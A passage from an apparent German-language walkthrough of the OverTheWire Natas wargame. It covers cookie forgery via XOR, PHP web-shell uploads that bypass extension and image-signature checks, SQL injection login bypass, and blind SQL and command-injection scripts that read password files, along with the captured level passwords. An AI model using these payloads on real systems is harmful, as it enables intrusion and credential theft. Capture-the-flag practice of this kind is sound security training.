  <span style="color:#75715e">// Iterate through each characterfor($i=0;$i&lt;strlen($text);$i++) 
</span><span style="color:#75715e"></span>  { 
    $outText <span style="color:#f92672">.=</span> $text[$i] <span style="color:#f92672">^</span> $key[$i <span style="color:#f92672">%</span> <span style="color:#a6e22e">strlen</span>($key)]; 
  } 
  <span style="color:#66d9ef">return</span> $outText; 
} 

<span style="color:#66d9ef">print</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">xor_encrypt</span>()); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Wenn wir die Funktion ausführen erhalten wir den Cookie <strong>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</strong></p>
<p>Ersetzen wir nun den Wert des Cookies <strong>data</strong> damit, müssen wir nur noch die Seite neu laden und es erscheint der Text</p>
<p><strong>The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</strong></p>
<h2 id="level-11---level-12"><strong>Level 11 -&gt; Level 12</strong></h2>
<p>Bei diesem Level können wir eine JPEG Datei hochladen. Sehen wir uns mal den Quelltext an.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">genRandomString</span>() {
  $length <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
  $characters <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdefghijklmnopqrstuvwxyz&#34;</span>;
  $string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;

  <span style="color:#66d9ef">for</span> ($p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $p <span style="color:#f92672">&lt;</span> $length; $p<span style="color:#f92672">++</span>) {
    $string <span style="color:#f92672">.=</span> $characters[<span style="color:#a6e22e">mt_rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($characters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)];
  }

  <span style="color:#66d9ef">return</span> $string;
  }

  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeRandomPath</span>($dir, $ext) {
  <span style="color:#66d9ef">do</span> {
    $path <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">genRandomString</span>()<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">.</span>$ext;
  } <span style="color:#66d9ef">while</span>(<span style="color:#a6e22e">file_exists</span>($path));
    <span style="color:#66d9ef">return</span> $path;
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeRandomPathFromFilename</span>($dir, $fn) {
  $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($fn, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>);
  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">makeRandomPath</span>($dir, $ext);
}

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;filename&#34;</span>, $_POST)) {
  $target_path <span style="color:#f92672">=</span> <span style="color:#a6e22e">makeRandomPathFromFilename</span>(<span style="color:#e6db74">&#34;upload&#34;</span>, $_POST[<span style="color:#e6db74">&#34;filename&#34;</span>]);

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">filesize</span>($_FILES[<span style="color:#e6db74">&#39;uploadedfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000</span>) {
  <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File is too big&#34;</span>;
} <span style="color:#66d9ef">else</span> {
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#39;uploadedfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $target_path)) {
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;The file &lt;a href=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$target_path\</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&gt;</span>$target_path<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">a</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">been</span> <span style="color:#a6e22e">uploaded</span><span style="color:#e6db74">&#34;;
</span><span style="color:#e6db74">  } else{
</span><span style="color:#e6db74">    echo &#34;</span><span style="color:#a6e22e">There</span> <span style="color:#a6e22e">was</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">error</span> <span style="color:#a6e22e">uploading</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">file</span>, <span style="color:#a6e22e">please</span> <span style="color:#66d9ef">try</span> <span style="color:#a6e22e">again</span><span style="color:#f92672">!</span><span style="color:#e6db74">&#34;;
</span><span style="color:#e6db74">  }
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">} else {
</span><span style="color:#e6db74">?&gt;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">&lt;form enctype=&#34;</span><span style="color:#a6e22e">multipart</span><span style="color:#f92672">/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span><span style="color:#e6db74">&#34; action=&#34;</span><span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#e6db74">&#34; method=&#34;</span><span style="color:#a6e22e">POST</span><span style="color:#e6db74">&#34;&gt; 
</span><span style="color:#e6db74">&lt;input type=&#34;</span><span style="color:#a6e22e">hidden</span><span style="color:#e6db74">&#34; name=&#34;</span><span style="color:#a6e22e">MAX_FILE_SIZE</span><span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#ae81ff">1000</span><span style="color:#e6db74">&#34; /&gt; 
</span><span style="color:#e6db74">&lt;input type=&#34;</span><span style="color:#a6e22e">hidden</span><span style="color:#e6db74">&#34; name=&#34;</span><span style="color:#a6e22e">filename</span><span style="color:#e6db74">&#34; value=&#34;</span><span style="color:#f92672">&lt;?</span> <span style="color:#66d9ef">print</span> <span style="color:#a6e22e">genRandomString</span>(); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">.jpg&#34; /&gt; 
</span><span style="color:#960050;background-color:#1e0010">Choose a JPEG to upload (max 1KB):&lt;br/&gt; 
</span><span style="color:#960050;background-color:#1e0010">&lt;input name=&#34;uploadedfile&#34; type=&#34;file&#34; /&gt;&lt;br /&gt; 
</span><span style="color:#960050;background-color:#1e0010">&lt;input type=&#34;submit&#34; value=&#34;Upload File&#34; /&gt; 
</span><span style="color:#960050;background-color:#1e0010">&lt;/form&gt; 
</span></code></pre></div><p>Wenn wir eine Datei hochladen, wird bekommt diese einen zufälligen 10-stelligen Namen, die Endung <strong>.jpg</strong> und wird unter <strong>/upload/</strong> gespeichert. Den Link zu der Datei bekommen wir danach angezeigt. Wir können ein PHP-Skript erstellen, welches für uns ein System-Kommando ausführt und müssen dafür sorgen, dass es mit der Endung <strong>.php</strong> in dem Ordner <strong>/upload/</strong> gespeichert wird und nicht mit der Endung <strong>.jpg</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#e6db74">&#34;&lt;?php system(\&#34;cat /etc/natas_webpass/natas13\&#34;); ?&gt;&#34;</span> &gt; cutecat.jpg
</code></pre></div><p>Durch dieses Kommando erstellen wir ein PHP-Skript welches auf dem Server <strong>cat /etc/natas_webpass/natas13</strong> ausführen wird. Das <strong>\</strong> ist bei <strong>echo</strong> ein escape character. Ohne das \ würde der echo Befehl bei <strong>system(&quot;</strong> enden. <strong>system</strong> führt bei PHP ein System Kommando aus und gibt den Output aus. Wird speichern das PHP-Skript als <strong>cutecat.jpg</strong> ab, wobei die Endung bei diesem Beispiel egal ist, da die Datei eh umbenannt wird und die Seite die Datei nicht auf ihre Endung überprüft.</p>
<p>Es gibt verschiedene Möglichkeiten, wie wir dafür sorgen können, dass unsere Datei nun als <strong>.php</strong> gespeichert wird.</p>
<p>Zum einen können wir <strong>Strg</strong> + <strong>Umschalt</strong> + <strong>I</strong> drücken um die Elemente der Seite zu untersuchen. Dann suchen wir nach dem verstecktem Input-Feld und können dort den Wert von <strong>filename</strong> ändern.</p>
<p><a href="https://imgur.com/AB3zREf"><img src="https://imgur.com/AB3zREf.jpg" alt="Element untersuchen"></a></p>
<p>Danach müssen wir nur noch auf <strong>Upload File</strong> klicken, die Datei wird unter dem Namen gespeichert, welchen wir festgelegt haben und wenn wir durch den Link, welcher uns angezeigt wird, die Datei ausführen, bekommen wir das Passwort angezeigt.</p>
<p>Alternativ können wir auch Burp benutzen. Wenn wir das Upload Anfrage abfangen, können wir dort auch den Dateinamen ändern.</p>
<p><a href="https://imgur.com/pV7pVjS"><img src="https://imgur.com/pV7pVjS.jpg" alt="Burp"></a></p>
<p>Wenn alles geklappt hat, bekommen wir das Password angzeigt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
</code></pre></div><h2 id="level-12---level-13"><strong>Level 12 -&gt; Level 13</strong></h2>
<p>Dieses Level ist eine Erweiterung zum vorherigen. Der Quelltext hat drei neue Zeilen dazu bekommen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">exif_imagetype</span>($_FILES[<span style="color:#e6db74">&#39;uploadedfile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>])) { 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File is not an image&#34;</span>; 
}
</code></pre></div><p>Jetzt wird bei der Datei, welche wir hochladen, zusätzlich überprüft um was für einen Bildtyp es sich bei der Datei handelt. Dies wird durch <strong>exif_imagetype(datei)</strong> realisiert. <strong>exif_imagetype</strong> liest die ersten Bytes der Datei aus und überprüft anhand der Signatur um welchen Dateityp es sich handelt. Wenn wir etwas anderes als eine Bilddatei hochladen erhalten wir nur die Rückmeldung <strong>File is not an image</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# file cutecat.jpg 
cutecat.jpg: PHP script, ASCII text
</code></pre></div><p>Auf Wikipedia können wir eine <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">Liste mit Signatur für verschiedene Dateitypen</a> finden. Die Signatur für JPEGs ist <strong>FF D8 FF DB</strong>.</p>
<p>Hier gibt es auch wieder verschiedene Möglichkeiten, wie wir die Signatur an den Anfang unserer Datei einfügen können, sodass diese als JPEG erkannt wird.</p>
<p>1.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo -e <span style="color:#e6db74">&#34;\xff\xd8\xff\xe0&#34;</span> &gt; jpeg
root@kali:~# file jpeg
jpeg: JPEG image data
</code></pre></div><p>Dadurch haben wir nun die JPEG Signatur in der Datei <strong>jpeg</strong> gespeichert. Jetzt müssen wir nur noch unser PHP-Skript erstellen und die beiden Dateien zusammenführen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# echo <span style="color:#e6db74">&#34;&lt;?php system(\&#34;cat /etc/natas_webpass/natas14\&#34;); ?&gt;&#34;</span> &gt; cutecat
root@kali:~# cat jpeg cutecat &gt; cutecatjpg
root@kali:~# file cutecatjpg
cutecat2: JPEG image data
</code></pre></div><ol start="2">
<li>Wir können auch den Hexeditor dafür benutzen.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# hexeditor -b cutecat
</code></pre></div><p>Viermal <strong>Strg + A</strong> drücken um null-Bytes zu erstellen, <strong>FF D8 FF DB</strong> eingeben und mit <strong>Strg + X</strong> speichern.</p>
<p><a href="https://imgur.com/l2oziBm"><img src="https://imgur.com/l2oziBm.jpg" alt="hexeditor"></a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# file cutecat
cutecat: JPEG image data
</code></pre></div><ol start="3">
<li>Wir laden unser Skript ganz normal hoch und fangen die Anfrage mit Burp ab. Wir kopieren dann die ASCII Kodierung der Signatur von Wikipedia und fügen diese vor dem Inhalt unserer Datei ein.</li>
</ol>
<p><a href="https://imgur.com/gqLbyb1"><img src="https://imgur.com/gqLbyb1.jpg" alt="kopieren"></a></p>
<p><a href="https://imgur.com/EItixfp"><img src="https://imgur.com/EItixfp.jpg" alt="einfügen bei burp"></a></p>
<p>Natürlich dürfen wir nicht vergessen, wie im vorherigen Level, dafür zu sorgen, dass unsere Datei wieder mit der Endung <strong>.php</strong> gespeichert wird. Wenn alles funktioniert hat, bekommen wir wieder das Passwort angezeigt, wenn wir dem Link zu unserer Datei folgen.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
</code></pre></div><h2 id="level-13---level-14"><strong>Level 13 -&gt; Level 14</strong></h2>
<p>Sehen wir uns den Quelltext an:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">[<span style="color:#f92672">...</span>]
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;username&#34;</span>, $_REQUEST)) 
  { 
  $link <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#e6db74">&#39;natas14&#39;</span>, <span style="color:#e6db74">&#39;&lt;censored&gt;&#39;</span>); 
  <span style="color:#a6e22e">mysql_select_db</span>(<span style="color:#e6db74">&#39;natas14&#39;</span>, $link); 
  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * from users where username=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$_REQUEST[<span style="color:#e6db74">&#34;username&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> and password=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$_REQUEST[<span style="color:#e6db74">&#34;password&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>;
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;debug&#34;</span>, $_GET)) 
  { 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Executing query: </span><span style="color:#e6db74">$query</span><span style="color:#e6db74">&lt;br&gt;&#34;</span>; 
  } 
  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysql_num_rows</span>(<span style="color:#a6e22e">mysql_query</span>($query, $link)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) 
  { 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span>; 
  } 
  <span style="color:#66d9ef">else</span> 
  { 
    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Access denied!&lt;br&gt;&#34;</span>; 
  } 
  <span style="color:#a6e22e">mysql_close</span>($link);
[<span style="color:#f92672">...</span>]
</code></pre></div><p>Wir können die genaue SQL Abfrage sehen, welche gemacht wird:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_INPUT&#34;</span> <span style="color:#66d9ef">AND</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;USER_INPUT&#34;</span>
</code></pre></div><p>Wir können nun eine ganz einfache SQL Injection machen, um an das Passwort zu kommen</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">username<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#34; OR &#34;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#ae81ff">1</span>  
password<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#34; OR &#34;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#34;=&#34;</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Dadurch erhalten wir folgende SQL Abfrage</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#66d9ef">AND</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>
</code></pre></div><p>Wir werden also also als irgendein beliebiger Benutzer eingeloggt.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://natas14.natas.labs.overthewire.org/?username<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#34; OR &#34;</span>1<span style="color:#e6db74">&#34;=&#34;</span>1&amp;password<span style="color:#f92672">=</span>test<span style="color:#e6db74">&#34; OR &#34;</span>1<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#ae81ff">1</span>
Successful login! The password <span style="color:#66d9ef">for</span> natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
</code></pre></div><h2 id="level-14---level-15"><strong>Level 14 -&gt; Level 15</strong></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# vim bruteforce.py
import requests
from requests.auth import HTTPBasicAuth

chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
correct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>

<span style="color:#66d9ef">for</span> char in chars:
Data <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;username&#39;</span> : <span style="color:#e6db74">&#39;natas16&#34; and password LIKE BINARY &#34;%&#39;</span> + char + <span style="color:#e6db74">&#39;%&#34; #&#39;</span><span style="color:#f92672">}</span>
r <span style="color:#f92672">=</span> requests.post<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;http://natas15.natas.labs.overthewire.org/index.php?debug&#39;</span>, auth<span style="color:#f92672">=</span>HTTPBasicAuth<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;natas15&#39;</span>, <span style="color:#e6db74">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span style="color:#f92672">)</span>, data <span style="color:#f92672">=</span> Data<span style="color:#f92672">)</span>
<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;exists&#39;</span> in r.text :
correct <span style="color:#f92672">+=</span> char
print<span style="color:#f92672">(</span>correct<span style="color:#f92672">)</span>

<span style="color:#66d9ef">for</span> i in range<span style="color:#f92672">(</span>0,32<span style="color:#f92672">)</span>:
<span style="color:#66d9ef">for</span> char in correct:
Data <span style="color:#f92672">=</span> <span style="color:#f92672">{</span><span style="color:#e6db74">&#39;username&#39;</span> : <span style="color:#e6db74">&#39;natas16&#34; and password LIKE BINARY &#34;&#39;</span> + passwd + char + <span style="color:#e6db74">&#39;%&#34; #&#39;</span><span style="color:#f92672">}</span>
r <span style="color:#f92672">=</span> requests.post<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;http://natas15.natas.labs.overthewire.org/index.php?debug&#39;</span>, auth<span style="color:#f92672">=</span>HTTPBasicAuth<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;natas15&#39;</span>, <span style="color:#e6db74">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span style="color:#f92672">)</span>, data <span style="color:#f92672">=</span> Data<span style="color:#f92672">)</span>
<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;exists&#39;</span> in r.text :
passwd <span style="color:#f92672">+=</span> char
print<span style="color:#f92672">(</span>passwd<span style="color:#f92672">)</span>
break
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python bruteforce.py
a
ac
ace
aceh
acehi
acehij
acehijm
acehijmn
acehijmnp
acehijmnpq
acehijmnpqt
acehijmnpqtw
acehijmnpqtwB
acehijmnpqtwBE
acehijmnpqtwBEH
acehijmnpqtwBEHI
acehijmnpqtwBEHIN
acehijmnpqtwBEHINO
acehijmnpqtwBEHINOR
acehijmnpqtwBEHINORW
acehijmnpqtwBEHINORW0
acehijmnpqtwBEHINORW03
acehijmnpqtwBEHINORW035
acehijmnpqtwBEHINORW0356
acehijmnpqtwBEHINORW03569
W
Wa
WaI
WaIH
WaIHE
WaIHEa
WaIHEac
WaIHEacj
WaIHEacj6
WaIHEacj63
WaIHEacj63w
WaIHEacj63wn
WaIHEacj63wnN
WaIHEacj63wnNI
WaIHEacj63wnNIB
WaIHEacj63wnNIBR
WaIHEacj63wnNIBRO
WaIHEacj63wnNIBROH
WaIHEacj63wnNIBROHe
WaIHEacj63wnNIBROHeq
WaIHEacj63wnNIBROHeqi
WaIHEacj63wnNIBROHeqi3
WaIHEacj63wnNIBROHeqi3p
WaIHEacj63wnNIBROHeqi3p9
WaIHEacj63wnNIBROHeqi3p9t
WaIHEacj63wnNIBROHeqi3p9t0
WaIHEacj63wnNIBROHeqi3p9t0m
WaIHEacj63wnNIBROHeqi3p9t0m5
WaIHEacj63wnNIBROHeqi3p9t0m5n
WaIHEacj63wnNIBROHeqi3p9t0m5nh
WaIHEacj63wnNIBROHeqi3p9t0m5nhm
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
</code></pre></div><h2 id="level-15---level-16"><strong>Level 15 -&gt; Level 16</strong></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">root<span style="color:#a6e22e">@kali</span>:<span style="color:#f92672">~</span><span style="color:#75715e"># vim bruteforce2.py</span>
<span style="color:#f92672">import</span> requests 
<span style="color:#f92672">from</span> requests.auth <span style="color:#f92672">import</span> HTTPBasicAuth 

auth<span style="color:#f92672">=</span>HTTPBasicAuth(<span style="color:#e6db74">&#39;natas16&#39;</span>, <span style="color:#e6db74">&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span>) 

correct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> 
allchars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#39;</span> 
<span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> allchars: 
 r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://natas16.natas.labs.overthewire.org/?needle=anything$(grep &#39;</span> <span style="color:#f92672">+</span> char <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; /etc/natas_webpass/natas17)&#39;</span>, auth<span style="color:#f92672">=</span>auth) 

 <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;anything&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text: 
 correct <span style="color:#f92672">+=</span> char 
 print(correct) 

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>): 
 <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> correct: 
 r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://natas16.natas.labs.overthewire.org/?needle=anything$(grep ^&#39;</span> <span style="color:#f92672">+</span> passwd <span style="color:#f92672">+</span> char <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; /etc/natas_webpass/natas17)&#39;</span>, auth<span style="color:#f92672">=</span>auth) 

 <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;anything&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text: 
 passwd <span style="color:#f92672">=</span> passwd <span style="color:#f92672">+</span> char 
 print(passwd) 
 <span style="color:#66d9ef">break</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~# python bruteforce2.py 
b
bc
bcd
bcdg
bcdgh
bcdghk
bcdghkm
bcdghkmn
bcdghkmnq
bcdghkmnqr
bcdghkmnqrs
bcdghkmnqrsw
bcdghkmnqrswA
bcdghkmnqrswAG
bcdghkmnqrswAGH
bcdghkmnqrswAGHN
bcdghkmnqrswAGHNP
bcdghkmnqrswAGHNPQ
bcdghkmnqrswAGHNPQS
bcdghkmnqrswAGHNPQSW
bcdghkmnqrswAGHNPQSW3
bcdghkmnqrswAGHNPQSW35
bcdghkmnqrswAGHNPQSW357
bcdghkmnqrswAGHNPQSW3578
bcdghkmnqrswAGHNPQSW35789
bcdghkmnqrswAGHNPQSW357890
<span style="color:#ae81ff">8</span>
8P
8Ps
8Ps3
8Ps3H
8Ps3H0
8Ps3H0G
8Ps3H0GW
8Ps3H0GWb
8Ps3H0GWbn
8Ps3H0GWbn5
8Ps3H0GWbn5r
8Ps3H0GWbn5rd
8Ps3H0GWbn5rd9
8Ps3H0GWbn5rd9S
8Ps3H0GWbn5rd9S7
8Ps3H0GWbn5rd9S7G
8Ps3H0GWbn5rd9S7Gm
8Ps3H0GWbn5rd9S7GmA
8Ps3H0GWbn5rd9S7GmAd
8Ps3H0GWbn5rd9S7GmAdg
8Ps3H0GWbn5rd9S7GmAdgQ
8Ps3H0GWbn5rd9S7GmAdgQN
8Ps3H0GWbn5rd9S7GmAdgQNd
8Ps3H0GWbn5rd9S7GmAdgQNdk
8Ps3H0GWbn5rd9S7GmAdgQNdkh
8Ps3H0GWbn5rd9S7GmAdgQNdkhP
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</code></pre></div><h2 id="level-16---level-17"><strong>Level 16 -&gt; Level 17</strong></h2>
<h2 id="level-17---level-18"><strong>Level 17 -&gt; Level 18</strong></h2>
<h2 id="level-18---level-19"><strong>Level 18 -&gt; Level 19</strong></h2>
<h2 id="level-19---level-20"><strong>Level 19 -&gt; Level 20</strong></h2>
<h2 id="level-20---level-21"><strong>Level 20 -&gt; Level 21</strong></h2>
<h2 id="level-21---level-22"><strong>Level 21 -&gt; Level 22</strong></h2>
<h2 id="level-22---level-23"><strong>Level 22 -&gt; Level 23</strong></h2>
<h2 id="level-23---level-24"><strong>Level 23 -&gt; Level 24</strong></h2>
<h2 id="level-24---level-25"><strong>Level 24 -&gt; Level 25</strong></h2>
<h2 id="level-25---level-26"><strong>Level 25 -&gt; Level 26</strong></h2>
